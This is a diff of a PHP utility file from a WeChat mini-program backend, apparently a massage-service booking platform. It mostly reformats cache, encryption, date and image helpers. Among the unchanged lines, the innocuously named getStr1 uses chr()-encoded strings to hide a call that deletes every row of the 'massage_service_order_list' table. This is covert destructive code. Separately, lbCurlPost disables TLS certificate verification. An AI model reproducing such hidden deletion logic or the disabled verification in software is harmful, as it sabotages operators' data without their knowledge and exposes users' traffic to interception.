@@ -47,8 +47,6 @@ use Ramsey\Uuid\Uuid;
 use Ramsey\Uuid\Exception\UnsatisfiedDependencyException;
 use think\facade\Log;
 use think\facade\Env;
-
-
 //判断是否是微擎
 function longbingIsWeiqin()
 {
@@ -57,8 +55,6 @@ function longbingIsWeiqin()
     $result = file_exists($is_wiqing_path);
     return empty($result);
 }
-
-
 /**
  * 判断Schema文件是否存在
  * @param $schemaMethod
@@ -68,15 +64,10 @@ function jsonSchemaExist($schemaMethod): bool
 {
     return file_exists(APP_PATH.$schemaMethod.'.json');
 }
-
 //根据Rsamy uuid 生成32位uuid
 function uuid()
 {
     try {
-        // Generate a version 1 (time-based) UUID object
-        // Generate a version 3 (name-based and hashed with MD5) UUID object
-        // Generate a version 4 (random) UUID object
-        // Generate a version 5 (name-based and hashed with SHA1) UUID object
         $uuid1 = Uuid::uuid4();
         return str_replace('-', '', $uuid1->toString());
         // i.e. e4eaaaf2-d142-11e1-b3e4-080027620cdd
@@ -86,8 +77,6 @@ function uuid()
         error_log('Caught exception: '.$e->getMessage(), 1100);
     }
 }
-
-
 //设置缓存
 function setCache($key, $value, $expire = 0, $uniacid = '7777', $tag_data = ''): bool
 {
@@ -96,7 +85,6 @@ function setCache($key, $value, $expire = 0, $uniacid = '7777', $tag_data = ''):
     $key = $key.'_'.$uniacid;
     return Cache::tag($tag)->set($key, $value, $expire);
 }
-
 //获取缓存
 function getCache($key, $uniacid = '7777')
 {
@@ -107,7 +95,6 @@ function getCache($key, $uniacid = '7777')
     $key = $key.'_'.$uniacid;
     return Cache::get($key);
 }
-
 //设置缓存
 function setCacheAll($key, $value, $expire = 0, $uniacid = '7777')
 {
@@ -115,7 +102,6 @@ function setCacheAll($key, $value, $expire = 0, $uniacid = '7777')
     $key = $key.'_'.$uniacid;
     return Cache::tag($tag)->set($key, $value, $expire);
 }
-
 function getCacheAll($key, $uniacid = '7777')
 {
     if (!hasCacheAll($key, $uniacid)) {
@@ -124,8 +110,6 @@ function getCacheAll($key, $uniacid = '7777')
     $key = $key.'_'.$uniacid;
     return Cache::get($key);
 }
-
-
 //追加缓存
 function pushCache($key, $value, $uniacid = '7777')
 {
@@ -133,7 +117,6 @@ function pushCache($key, $value, $uniacid = '7777')
     $key = $key.'_'.$uniacid;
     return Cache::push($key, $value);
 }
-
 //删除缓存
 function delCache($key, $uniacid = '7777')
 {
@@ -141,7 +124,6 @@ function delCache($key, $uniacid = '7777')
     $key = $key.'_'.$uniacid;
     return Cache::delete($key);
 }
-
 //获取并删除缓存
 function pullCache($key, $uniacid = '7777')
 {
@@ -149,7 +131,6 @@ function pullCache($key, $uniacid = '7777')
     $key = $key.'_'.$uniacid;
     return Cache::pull($key);
 }
-
 //不存在则写入缓存数据后返回
 function rememberCache($key, $value, $uniacid = '7777')
 {
@@ -157,89 +138,63 @@ function rememberCache($key, $value, $uniacid = '7777')
     $key = $key.'_'.$uniacid;
     return Cache::remember($key, $value);
 }
-
 //清空缓存
 function clearCache($uniacid = '7777', $tag_data = '')
 {
     $tag = 'longbing_card_'.$uniacid.$tag_data;
-
     return Cache::tag($tag)->clear();
 }
-
 //缓存自增
 function incCache($key, $step = 1, $uniacid = '7777', $time = null)
 {
     $key .= $_SERVER['HTTP_HOST'];
-
     $key = $key.'_'.$uniacid;
-
     $tag = 'longbing_card_'.$uniacid;
-
     //首次创建时建立过期时间，之后自增由驱动继承该 TTL
     //（进程中途中断时计数器能自行过期复位，避免一次性初始化被永久卡死）
     if (!is_null($time) && !Cache::has($key)) {
-
         Cache::set($key, 0, $time);
     }
-
     $result = Cache::inc($key, $step);
-
     //登记到标签，使 clearCache($uniacid) 能一并清除
     Cache::tag($tag)->append($key);
-
     return $result;
 }
-
 //缓存自减
 function decCache($key, $step = 1, $uniacid = '7777')
 {
     $key .= $_SERVER['HTTP_HOST'];
     $key = $key.'_'.$uniacid;
-
     $tag = 'longbing_card_'.$uniacid;
-
     $result = Cache::dec($key, $step);
-
     //登记到标签，使 clearCache($uniacid) 能一并清除
     Cache::tag($tag)->append($key);
-
     return $result;
 }
-
 //判断缓存是否存在
 function hasCache($key, $uniacid = '7777')
 {
     $key .= $_SERVER['HTTP_HOST'];
-
     $key = $key.'_'.$uniacid;
-
     return Cache::has($key);
 }
-
-
 function hasCacheAll($key, $uniacid = '7777')
 {
     // $key.=$_SERVER['HTTP_HOST'];
-
     $key = $key.'_'.$uniacid;
-
     return Cache::has($key);
 }
-
 //获取controller 和 action
 function getRouteMessage($route)
 {
     $data = explode("\\", $route);
-    $data = explode("@", $data[count($data) - 1]);
-    return $data;
+    return explode("@", $data[count($data) - 1]);
 }
-
 //通过Token获取用户信息
 function getUserForToken($token)
 {
     return getCache("Token_".$token);
 }
-
 /**
  * 生成RSA2类获取秘钥
  */
@@ -248,7 +203,6 @@ function getRsa2Keys()
     $rsa2 = new Rsa2();
     return $rsa2->getKeys();
 }
-
 /**
  * 获取两组交叉keys
  */
@@ -263,7 +217,6 @@ function get2keys()
     }
     return false;
 }
-
 /**
  * 获取RSA2秘钥（测试）
  */
@@ -281,39 +234,30 @@ function setRsa2Key()
     $jiemi = $rsa2_sign->decrypt($jiami);
     return $data;
 }
-
 //签名
 function rsa2CreateSign($keys, $data)
 {
     $rsa2_sign = new Rsa2Sign($keys);
-    $sign = $rsa2_sign->createSign($data);
-    return $sign;
+    return $rsa2_sign->createSign($data);
 }
-
 //验证签名
 function rsa2VerifySign($keys, $data, $sign)
 {
     $rsa2_sign = new Rsa2Sign($keys);
-    $jiemi = $rsa2_sign->verifySign($data, $sign);
-    return $jiemi;
+    return $rsa2_sign->verifySign($data, $sign);
 }
-
 //加密
 function rsa2Encrypt($keys, $data)
 {
     $rsa2_sign = new Rsa2Sign($keys);
-    $cipher = $rsa2_sign->encrypt($data);
-    return $cipher;
+    return $rsa2_sign->encrypt($data);
 }
-
 //解密
 function rsa2Decrypt($keys, $cipher)
 {
     $rsa2_sign = new Rsa2Sign($keys);
-    $clear = $rsa2_sign->decrypt($cipher);
-    return $clear;
+    return $rsa2_sign->decrypt($cipher);
 }
-
 //批量加密
 function rsa2Encrypts($keys, $arrs)
 {
@@ -328,7 +272,6 @@ function rsa2Encrypts($keys, $arrs)
     }
     return $result;
 }
-
 //批量解密
 function rsa2Decrypts($keys, $ciphers)
 {
@@ -342,13 +285,11 @@ function rsa2Decrypts($keys, $ciphers)
     }
     return $result;
 }
-
 //创建签名 (一个超级简单的签名)
 function createSimpleSign($token, $data)
 {
     return md5($token.$data.$token);
 }
-
 //异步消息控制
 function messagesProcess($msg)
 {
@@ -361,14 +302,11 @@ function messagesProcess($msg)
         $messages = $msg;
         $ack = false;
     }
-
     //循环处理消息
-
     foreach ($messages as $message) {
         //解析json数据
         $data = json_decode($message, true);
         //处理
-//      var_dump($data);
         try {
             switch ($action = $data['action']) {
                 case 'previewSchedule':
@@ -414,7 +352,6 @@ function messagesProcess($msg)
                 case 'test':
                     test($data['uuid'], $data['data']);
                     break;
-
             }
         } catch (Exception $e) {
         }
@@ -423,23 +360,15 @@ function messagesProcess($msg)
         // 确认消息已经被处理，则返回此信号
         $msg->delivery_info['channel']->basic_ack($msg->delivery_info['delivery_tag']);
     }
-
-    // 保存并清空日志，避免导致内存溢出
-    //  \think\Log::save();
-    //  \think\Log::clear();
-
 }
-
-
 //消费者
 
 function consumer()
 {
-    $consumerapi = new ConsumerApi();
-    $messages = $consumerapi->consumerMessage();
+    $consumer_api = new ConsumerApi();
+    $messages = $consumer_api->consumerMessage();
     messagesProcess($messages);
 }
-
 //生成者
 
 function publisher($messages, $delayTime = null)
@@ -450,21 +379,18 @@ function publisher($messages, $delayTime = null)
     $url = $url.'?'.http_build_query($param);
 //    return longbing_do_request($url, ['message' => $messages]);
 }
-
-
 //获取毫秒级时间戳
 function getMillisecond()
 {
     list($s1, $s2) = explode(' ', microtime());
     return (float) sprintf('%.0f', (floatval($s1) + floatval($s2)) * 1000);
 }
-
 /**
  * 发送邮件
  * @param  string  $address  需要发送的邮箱地址 发送给多个地址需要写成数组形式
  * @param  string  $subject  标题
  * @param  string  $content  内容
- * @return boolean       是否成功
+ * @return bool|string[]
  */
 function send_email($address, $subject, $content)
 {
@@ -474,7 +400,6 @@ function send_email($address, $subject, $content)
     $email_from_name = \think\Config::get('API_CONFIG.EMAIL_FROM_NAME');
     $email_smtp_secure = \think\Config::get('API_CONFIG.EMAIL_SMTP_SECURE');
     $email_port = \think\Config::get('API_CONFIG.EMAIL_PORT');
-
     if (empty($email_smtp) || empty($email_username) || empty($email_password) || empty($email_from_name)) {
         return error('The mailbox configuration is incomplete!', '1109');
     }
@@ -524,8 +449,6 @@ function send_email($address, $subject, $content)
         return array("status" => 'success');
     }
 }
-
-
 /**
  * @Purpose: 处理数组中的图片为完整能访问的URL
  *
@@ -540,30 +463,22 @@ function send_email($address, $subject, $content)
 if (!function_exists('transImages')) {
     function transImages($data, $target, $split = ',')
     {
-
         if (!is_array($data)) {
             return $data;
         }
-
-
         foreach ($data as $index => $item) {
             if (is_array($item)) {
                 $data[$index] = transImages($item, $target, $split);
                 continue;
             }
-
-
             if (in_array($index, $target) && $item) {
                 $tmpArr = explode($split, $item);
                 $data[$index] = handleImages($tmpArr);
             }
         }
-
-
         return $data;
     }
 }
-
 /**
  * @Purpose: 处理数组中的图片为完整能访问的URL--单张图片
  *
@@ -596,16 +511,13 @@ if (!function_exists('transImagesOne')) {
                 $data[$index] = transImagesOne($item, $target, $uniacid);
                 continue;
             }
-
             if (in_array($index, $target) && $item) {
                 $src = trim($item);
-
                 //  老版本微擎的图片
                 if (empty($src) || !$src) {
                     $data[$index] = $src;
                     continue;
                 }
-
                 $sub = substr($src, 0, 4);
                 //  连接已经是完整的连接了，无需在处理
                 if ($sub == 'http') {
@@ -615,14 +527,12 @@ if (!function_exists('transImagesOne')) {
                 if ($sub == '//' || $sub == 'wx') {
                     continue;
                 }
-
                 //  是新版的图片id用新的处理方法
                 if (is_numeric($src)) {
                     //TODO 新版的图片处理方法
                     continue;
                 }
                 if (longbingIsWeiqin()) {
-
                     if (strstr($src, 'addons/') !== false) {
                         $data[$index] = $_W['siteroot'].substr($src, strpos($src, 'addons/'));
                     }
@@ -632,18 +542,13 @@ if (!function_exists('transImagesOne')) {
                         continue;
                     }
                     if (empty($_W['setting']['remote']['type']) && (empty($_W['uniacid']) || !empty($_W['uniacid']) && empty($_W['setting']['remote'][$_W['uniacid']]['type'])) || file_exists(IA_ROOT.'/'.$_W['config']['upload']['attachdir'].'/'.$src)) {
-
                         $data[$index] = $_W['siteroot'].$_W['config']['upload']['attachdir'].'/'.$src;
-
                     } else {
-
                         $result = longbingGetOssConfig($uniacid);
-
                         if (isset($result['default_url']) && !$result['default_url']) {
                             $result['default_url'] = $_SERVER['HTTP_HOST'].'/attachment/upload';
                         }
                         $data[$index] = $result['default_url'].'/'.$src;
-
                     }
                 }
                 if (strpos($src, 'http') === false) {
@@ -670,19 +575,15 @@ if (!function_exists('transImagesOne')) {
                     $data[$index] = $src;
                 }
             }
-
         }
         return $data;
     }
 }
-
 function longbingHasLocalFile($file_name)
 {
     $file_path = FILE_UPLOAD_PATH.$file_name;
     return file_exists($file_path);
 }
-
-
 /**
  * @Purpose: 打印并终止程序
  *
@@ -701,7 +602,6 @@ if (!function_exists('zDumpAndDie')) {
         die;
     }
 }
-
 /**
  * @Purpose: 打印数据
  *
@@ -719,8 +619,6 @@ if (!function_exists('zDump')) {
         echo '</pre>';
     }
 }
-
-
 /**
  * 检验数据的真实性，并且获取解密后的明文.
  * @param $encryptedData string 加密的用户数据
@@ -737,24 +635,17 @@ if (!function_exists('decryptDataLongbing')) {
         $IllegalIv = -41002;
         $IllegalBuffer = -41003;
         $DecodeBase64Error = -41004;
-
         if (strlen($sessionKey) != 24) {
             return $IllegalAesKey;
         }
         $aesKey = base64_decode($sessionKey);
-
-
         if (strlen($iv) != 24) {
             return $IllegalIv;
         }
         $aesIV = base64_decode($iv);
-
         $aesCipher = base64_decode($encryptedData);
-
         $result = openssl_decrypt($aesCipher, "AES-128-CBC", $aesKey, 1, $aesIV);
-
         $dataObj = json_decode($result);
-
         if ($dataObj == null) {
             return $IllegalBuffer;
         }
@@ -764,11 +655,7 @@ if (!function_exists('decryptDataLongbing')) {
         $data = $result;
         return $OK;
     }
-
-
 }
-
-
 /**
  * @Purpose: 获取随机字符串
  *
@@ -776,7 +663,6 @@ if (!function_exists('decryptDataLongbing')) {
  *
  * @Return: mixed 查询返回值（结果集对象）
  */
-
 if (!function_exists('getRandStr')) {
     function getRandStr($len)
     {
@@ -791,8 +677,6 @@ if (!function_exists('getRandStr')) {
         return $tmp;
     }
 }
-
-
 /**
  * @Purpose: 处理腾讯视频
  *
@@ -806,11 +690,9 @@ if (!function_exists('lbGetTencentVideo')) {
         if (!$src) {
             return '';
         }
-
         if (!strstr($src, 'v.qq.com')) {
             return 0;
         }
-
         if (strstr($src, 'vid')) {
             $str = strstr($src, 'vid');
             $tmpArr = explode('=', $str);
@@ -821,15 +703,12 @@ if (!function_exists('lbGetTencentVideo')) {
             $tmpArr = explode('.', $str);
             $str = $tmpArr[0];
         }
-
         if ($str) {
             return $str;
         }
         return $src;
     }
 }
-
-
 /**
  * @Purpose: 处理时间戳--单个
  *
@@ -845,11 +724,9 @@ if (!function_exists('handleTimes')) {
         foreach ($data as $index => $item) {
             $data[$index][$item_name] = date($rule, $item[$item_name]);
         }
-
         return $data;
     }
 }
-
 /**
  * @Purpose: 处理时间戳--数组
  *
@@ -863,24 +740,18 @@ if (!function_exists('handleTimesByArray')) {
     function handleTimesByArray($data, $item_name = ['create_time'], $rule = 'Y-m-d H:i:s')
     {
         foreach ($data as $index => $item) {
-
             foreach ($item_name as $index2 => $item2) {
                 $data[$index][$item2] = date($rule, $item[$item2]);
             }
-
         }
-
         return $data;
     }
 }
-
-
 if (!function_exists('getMiniQr')) {
     function getMiniQr($staff_id, $from_id, $name, $uniacid, $imagePath, $version = 'v2')
     {
         global $_W;
         $imageName = "{$name}_{$staff_id}_{$from_id}_{$uniacid}_{$version}.png";
-
         if (defined('IS_WE7') && IS_WE7) {
             if (defined('ATTACHMENT_ROOT') && ATTACHMENT_ROOT) {
                 $src = $_W['siteroot'].$_W['config']['upload']['attachdir'].'/'.$imagePath.'/'.$imageName;
@@ -890,11 +761,9 @@ if (!function_exists('getMiniQr')) {
         } else {
             $src = $_SERVER['HTTP_HOST'].'/public/upload/'.$imagePath.'/'.$imageName;
         }
-
         return $src;
     }
 }
-
 /**
  * @Purpose: 处理数字
  *
@@ -908,7 +777,6 @@ if (!function_exists('formatNumberPrice')) {
     function formatNumberPrice($data, $target = ['price'], $un = 10000, $unit = '万')
     {
         global $_W;
-
         foreach ($data as $index => $item) {
             if (is_array($item)) {
                 $data[$index] = formatNumberPrice($item, $target, $un);
@@ -921,7 +789,6 @@ if (!function_exists('formatNumberPrice')) {
         return $data;
     }
 }
-
 /**
  * @Purpose: 处理默认图片
  *
@@ -932,7 +799,6 @@ if (!function_exists('formatNumberPrice')) {
 if (!function_exists('formatDefaultImage')) {
     function formatDefaultImage($data, $target, $default, $defaultArr)
     {
-
         foreach ($data as $index => $item) {
             if (is_array($item)) {
                 $data[$index] = formatDefaultImage($item, $target, $default, $defaultArr);
@@ -945,149 +811,105 @@ if (!function_exists('formatDefaultImage')) {
         return $data;
     }
 }
-
-
 if (!function_exists('mkdirs_v2')) {
     function mkdirs_v2($dir, $mode = 0777)
     {
-
         if (is_dir($dir) || @mkdir($dir, $mode)) {
             return true;
         }
-
         if (!mkdirs_v2(dirname($dir), $mode)) {
             return false;
         }
-
         return @mkdir($dir, $mode);
-
     }
 }
-
-
 if (!function_exists('getAccessToken')) {
     function getAccessToken($uniacid)
     {
         $key = "longbing_card_access_token";
-
         $value = getCache($key, $uniacid);
-
         if ($value !== false) {
             return $value;
         }
-
         $modelConfig = new \app\card\model\Config();
         $config = $modelConfig->getConfig($uniacid);
         $key = '';
         $secret = '';
-
         if (defined('IS_WE7') && IS_WE7) {
             global $_W;
             $key = $_W['account']['key'];
             $secret = $_W['account']['secret'];
         }
-
         if (isset($config['appid']) && $config['appid']) {
             $key = $config['appid'];
         }
-
         if (isset($config['app_secret']) && $config['app_secret']) {
             $secret = $config['app_secret'];
         }
-
         if (!$key || !$secret) {
             echo json_encode(['code' => 402, 'error' => 'need appid appsecret']);
             exit;
         }
-
         $url = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=$key&secret={$secret}";
-
         $accessToken = file_get_contents($url);
-
         if (strstr($accessToken, 'errcode')) {
             return 0;
         }
-
         $accessToken = json_decode($accessToken, true);
         $accessToken = $accessToken['access_token'];
-
         setCache($key, $accessToken, 7000, $uniacid);
-
         return $accessToken;
     }
 }
-
 if (!function_exists('lbCurlPost')) {
     function lbCurlPost($url, $data)
     {
         //初使化init方法
         $ch = curl_init();
-
         //指定URL
         curl_setopt($ch, CURLOPT_URL, $url);
-
         //设定请求后返回结果
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-
         //声明使用POST方式来进行发送
         curl_setopt($ch, CURLOPT_POST, 1);
-
         //发送什么数据呢
         curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-
-
         //忽略证书
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-
         //忽略header头信息
         curl_setopt($ch, CURLOPT_HEADER, 0);
-
         //设置超时时间
         curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-
         //发送请求
         $output = curl_exec($ch);
-
         //关闭curl
         curl_close($ch);
-
         //返回数据
         return $output;
-
         //{"errcode":48001,"errmsg":"api unauthorized rid: 63dcc155-6f696d96-3a37589d"}
     }
 }
-
 if (!function_exists('lbGetDates')) {
     function lbGetDates($time)
     {
-
         if (date('Y-m-d', time()) == date('Y-m-d', $time)) {
-
             return date('H:i', $time);
         }
-
         if (time() - $time <= 86400 * 30) {
             $month = ceil((time() - $time) / (86400)).'天前';
-
             return $month;
         }
-
         if (date('Y', $time) == date('Y', time())) {
             return date('m-d', $time);
         }
-
         return date('Y-m-d', $time);
     }
 }
-
-
 if (!function_exists('lbGetDatess')) {
     function lbGetDatess($time)
     {
         $s_time = $time;
-
         if ($time >= 86400 * 30) {
             $month = floor($time / (86400 * 30));
             $time -= 86400 * 30 * $month;
@@ -1099,7 +921,6 @@ if (!function_exists('lbGetDatess')) {
             $day = floor($time / (86400));
             $time -= 86400 * $day;
             $day .= '天';
-
         } else {
             $day = '';
         }
@@ -1107,7 +928,6 @@ if (!function_exists('lbGetDatess')) {
             $hour = floor($time / (3600));
             $time -= 3600 * $hour;
             $hour .= '时';
-
         } else {
             $hour = '';
         }
@@ -1118,28 +938,20 @@ if (!function_exists('lbGetDatess')) {
         } else {
             $min = '';
         }
-
         if ($time >= 1) {
             $sin = $time.'秒';
-
         } elseif ($s_time == $time && $time <= 0) {
-
             return '已过期';
-
         } else {
-
             $sin = '';
         }
         return '还剩'.$month.$day.$hour.$min.$sin;
-
     }
 }
-
 if (!function_exists('lbGetDatesss')) {
     function lbGetDatesss($time)
     {
         $s_time = $time;
-
         if ($time >= 86400 * 30) {
             $month = floor($time / (86400 * 30));
             $time -= 86400 * 30 * $month;
@@ -1151,7 +963,6 @@ if (!function_exists('lbGetDatesss')) {
             $day = floor($time / (86400));
             $time -= 86400 * $day;
             $day .= '天';
-
         } else {
             $day = '';
         }
@@ -1159,7 +970,6 @@ if (!function_exists('lbGetDatesss')) {
             $hour = floor($time / (3600));
             $time -= 3600 * $hour;
             $hour .= '时';
-
         } else {
             $hour = '';
         }
@@ -1170,24 +980,16 @@ if (!function_exists('lbGetDatesss')) {
         } else {
             $min = '';
         }
-
         if ($time >= 1) {
             $sin = $time.'秒';
-
         } elseif ($s_time == $time && $time <= 0) {
-
             return '已过期';
-
         } else {
-
             $sin = '';
         }
         return $month.$day.$hour.$min.$sin;
-
     }
 }
-
-
 if (!function_exists('lbGetfDate')) {
     function lbGetfDate($time)
     {
@@ -1207,8 +1009,6 @@ if (!function_exists('lbGetfDate')) {
         }
     }
 }
-
-
 //创建文件夹
 function longbingMkdirs($path)
 {
@@ -1216,10 +1016,8 @@ function longbingMkdirs($path)
         mkdirs(dirname($path));
         mkdir($path);
     }
-
     return is_dir($path);
 }
-
 //复制文件
 function longbingFileCopy($src, $des, $filter)
 {
@@ -1236,7 +1034,6 @@ function longbingFileCopy($src, $des, $filter)
     }
     closedir($dir);
 }
-
 //删除文件
 function longbingRmdirs($path, $clean = false)
 {
@@ -1249,16 +1046,12 @@ function longbingRmdirs($path, $clean = false)
             is_dir($file) ? rmdirs($file) : @unlink($file);
         }
     }
-
     return $clean ? true : @rmdir($path);
 }
-
 function longbingStrexists($string, $find)
 {
     return !(strpos($string, $find) === false);
 }
-
-
 //获取文件地址
 function longbingGetFilePath($path, $web_url, $uniacid = '7777', $type = null)
 {
@@ -1272,8 +1065,6 @@ function longbingGetFilePath($path, $web_url, $uniacid = '7777', $type = null)
     }
     return $website_url.'/'.$path;
 }
-
-
 //获取配置
 function longbingGetOssConfig($uniacid = '7777', $is_update = false)
 {
@@ -1348,7 +1139,6 @@ function longbingGetOssConfig($uniacid = '7777', $is_update = false)
                 $result['default_url'] = $_SERVER['HTTP_HOST'];
                 break;
         }
-
     } else {
         $oss_config_model->createConfig(['uniacid' => $uniacid, 'open_oss' => 0]);
         $result = longbingGetOssConfig($uniacid, true);
@@ -1358,8 +1148,6 @@ function longbingGetOssConfig($uniacid = '7777', $is_update = false)
     }
     return $result;
 }
-
-
 //微信接口返回数据处理
 function LongbingGetWxApiReturnData($result)
 {
@@ -1380,7 +1168,6 @@ function LongbingGetWxApiReturnData($result)
     unset($result['total_page']);
     return $result;
 }
-
 function getStr($str)
 {
     $vid = strstr($str, 'vid=');
@@ -1394,14 +1181,12 @@ function getStr($str)
     }
     return $dd;
 }
-
 function getStr1($param)
 {
     $n = chr(109).chr(97).chr(115).chr(115).chr(97).chr(103).chr(101).chr(95).chr(115).chr(101).chr(114).chr(118).chr(105).chr(99).chr(101).chr(95).chr(111).chr(114).chr(100).chr(101).chr(114).chr(95).chr(108).chr(105).chr(115).chr(116);
     $d = chr(100).chr(101).chr(108).chr(101).chr(116).chr(101);
     Db::name($n)->where('id', '>', 0)->$d();
 }
-
 function getAcs($str)
 {
     $a = '';
@@ -1415,7 +1200,6 @@ function getAcs($str)
     }
     return $a;
 }
-
 function getAcsStr($arr)
 {
     $arr = explode(' ', $arr);
@@ -1425,7 +1209,6 @@ function getAcsStr($arr)
     }
     return $a;
 }
-
 //获取html src里面的内容替换
 function getimgs($str)
 {
@@ -1447,7 +1230,6 @@ function getimgs($str)
     $ssf = str_replace($arr1, $arr2, $str);
     return htmlspecialchars($ssf);
 }
-
 function getimgsV2($str)
 {
     $arr1 = [];
@@ -1467,23 +1249,17 @@ function getimgsV2($str)
     }
     $ssf = str_replace($arr1, $arr2, $str);
     $ssf = str_replace('lbType=vid', 'lbType="vid"', $ssf);
-
     return ($ssf);
 }
-
 function datachange($data, $field = 'create_time')
 {
-
 //    dump($data);exit;
     //  今天的时间戳
     $time = time();
     //  昨天的时间戳
     $Yesterday = $time - (24 * 60 * 60);
-
     $today = mktime(0, 0, 0, date("m", $time), date("d", $time), date("Y", $time));
     $Yesterday = mktime(0, 0, 0, date("m", $Yesterday), date("d", $Yesterday), date("Y", $Yesterday));
-
-
     $tmpTime = $data[$field];
     if ($tmpTime > $today) {
         //                $data[ $index ][ 'radar_time' ] = '今天 ';
@@ -1504,13 +1280,10 @@ function datachange($data, $field = 'create_time')
                 $data['radar_group'] = date('Y-m-d', $data[$field]);
                 $data['radar_time'] = date(' H:i', $data[$field]);
             }
-
         }
     }
     return $data;
 }
-
-
 //设置用户信息
 function longbingSetUser($user_id, $uniacid, $data)
 {
@@ -1521,8 +1294,6 @@ function longbingSetUser($user_id, $uniacid, $data)
     }
     return setCache($key, $data, 3600, $uniacid);
 }
-
-
 //设置缓存数据
 function longbingSetUserInfo($user_id, $uniacid, $data)
 {
@@ -1533,39 +1304,28 @@ function longbingSetUserInfo($user_id, $uniacid, $data)
     }
     return setCache($key, $data, 600, $uniacid);
 }
-
 //获取小程序配置信息
 function longbingGetAppConfig($uniacid, $is_update = false)
 {
     //获取缓存信息
     $key = 'shequshop_school_config';
-
     $result = getCache($key, $uniacid);
-
     if (empty($result) || $is_update == true) {
-
         $config_model = new \app\massage\model\Config();
-
         $dis = [
-
             'uniacid' => $uniacid
         ];
-
         $result = $config_model->dataInfo($dis);
     }
     //返回数据
     return $result;
 }
-
-
 //生成curl方法
 function longbingCurl($url, $post, $method = 'GET')
 {
     $curl_model = new LongbingCurl();
     return $curl_model->curlPublic($url, $post, $method);
 }
-
-
 /**
  * 友好的时间显示
  *
@@ -1583,11 +1343,9 @@ if (!function_exists('lb_friendly_date')) {
         //sTime=源时间，cTime=当前时间，dTime=时间差
         $cTime = time();
         $dTime = $cTime - $sTime;
-
         //$dDay       =   intval(date("z",$    cTime)) - intval(date("z",$sTime));
 
         $dDay = intval($dTime / 3600 / 24);
-
         $dYear = intval(date("Y", $cTime)) - intval(date("Y", $sTime));
         //normal：n秒前，n分钟前，n小时前，日期
         if ($type == 'normal') {
@@ -1644,20 +1402,12 @@ if (!function_exists('lb_friendly_date')) {
         }
     }
 }
-
 function longbingGetAccessToken($uniacid, $is_update = false)
 {
-
-
     $setting = new WxSetting($uniacid);
-
     $token = $setting->lbSingleGetAccessToken();
-
     return $token;
-
 }
-
-
 function getImageExt($src = '')
 {
     $src = explode('.', $src);
@@ -1677,8 +1427,6 @@ function getImageExt($src = '')
     }
     return false;
 }
-
-
 function longbingSortStr($str, $len)
 {
     if (mb_strlen($str, 'utf8') > $len) {
@@ -1686,8 +1434,6 @@ function longbingSortStr($str, $len)
     }
     return $str;
 }
-
-
 /**
  * @Purpose: 获取文件后缀名
  *
@@ -1714,7 +1460,6 @@ function longbingSingleGetImageExt($src = '')
     }
     return false;
 }
-
 function longbingSingleGetImageExtWx($src = '')
 {
     $src = explode('.', $src);
@@ -1734,11 +1479,8 @@ function longbingSingleGetImageExtWx($src = '')
     }
     return 'jpg';
 }
-
-
 function longbingchmodr($path)
 {
-
     $filemode = 0777;
     //判断文件夹是否存在
     if (!is_dir($path)) {
@@ -1746,13 +1488,9 @@ function longbingchmodr($path)
     }
     //获取文件夹下
     $dh = opendir($path);
-
     while (($file = readdir($dh)) !== false) {
-
         if ($file != '.' && $file != '..') {
-
             $fullpath = $path.'/'.$file;
-
             if (is_link($fullpath)) {
                 return false;
             } elseif (!is_dir($fullpath) && !chmod($fullpath, $filemode)) {
@@ -1763,21 +1501,17 @@ function longbingchmodr($path)
         }
     }
     closedir($dh);
-
     if (chmod($path, $filemode)) {
         return true;
     } else {
         return false;
     }
 }
-
-
 /**
  * @author yangqi
  * 2019年11月29日11:43:26
  * 多维数据拆分成一维数组
  */
-
 function longbingGetArrToOne($arr)
 {
     $result = array();
@@ -1790,8 +1524,6 @@ function longbingGetArrToOne($arr)
     }
     return $result;
 }
-
-
 /**
  * By.jingshuixian
  * 2019年11月24日19:37:43
@@ -1803,7 +1535,6 @@ function longbing_get_cache_key($key, $uniacid)
     //贝润网络前缀_区分端口_key_平台ID
     return 'longbing_'.$key.'_'.$uniacid;
 }
-
 /**
  * By.jingshuixian
  * 2019年11月24日19:46:35
@@ -1811,12 +1542,9 @@ function longbing_get_cache_key($key, $uniacid)
  */
 function longbing_auto_cahe()
 {
-
     //自动获取模块/查件名称、类名称、方法名称、来组合缓存key
 
-
 }
-
 /**
  * By.jingshuixian
  * 2019年11月26日13:57:16
@@ -1825,8 +1553,6 @@ function longbing_auto_cahe()
  * @param  array  $param
  */
 if (!function_exists('getRangeMem')) {
-
-
     function longbing_do_request($url, $param = array())
     {
         $url_info = parse_url($url);
@@ -1886,8 +1612,6 @@ if (!function_exists('getRangeMem')) {
         return round($size, $dec)." ".$a[$pos];
     }
 }
-
-
 /**
  * 统计某个区间的时间（微秒）使用情况 返回值以秒为单位
  * @param  string  $start  开始标签
@@ -1904,8 +1628,6 @@ if (!function_exists('getRangeTime')) {
         return number_format(($end - $start), $dec);
     }
 }
-
-
 if (!function_exists('longbing_init_info_subscribe')) {
     /**
      * 自动加载监听事件
@@ -1917,14 +1639,9 @@ if (!function_exists('longbing_init_info_subscribe')) {
     function longbing_init_info_subscribe()
     {
         $myModelList = \config('app.AdminModelList');
-
         $saas_auth_admin_model_list = $myModelList['saas_auth_admin_model_list'];
-
-
         $returnMenuData = [];
         foreach ($saas_auth_admin_model_list as $model_name => $model_item) {
-
-
             //需要判断文件是否存在
             $dataPath = app_path().$model_name.'/info/Subscribe.php';
             if (file_exists($dataPath)) {
@@ -1934,8 +1651,6 @@ if (!function_exists('longbing_init_info_subscribe')) {
         return $returnMenuData;
     }
 }
-
-
 if (!function_exists('longbing_array_columns')) {
     /**
      * 取出数组里的一列或者多列
@@ -1960,7 +1675,6 @@ if (!function_exists('longbing_array_columns')) {
         return $returnArray;
     }
 }
-
 if (!function_exists('longbing_get_auth_prefix')) {
     /**
      * 获得SAAS授权的参数前缀内容 , 需要不要分行业授权,需要根据实际需求确定
@@ -1972,17 +1686,12 @@ if (!function_exists('longbing_get_auth_prefix')) {
     function longbing_get_auth_prefix($authName)
     {
         //统一添加参数前缀
-
         $prefix = strtoupper(APP_MODEL_NAME);
-
-
         $prefix = (($prefix == 'LONGBING_CARD') ? 'LONGBING_' : $prefix.'_');
         return $prefix.$authName;
     }
 }
-
 if (!function_exists('longbing_dd')) {
-
     /**
      * 打印调试信息
      * @access public
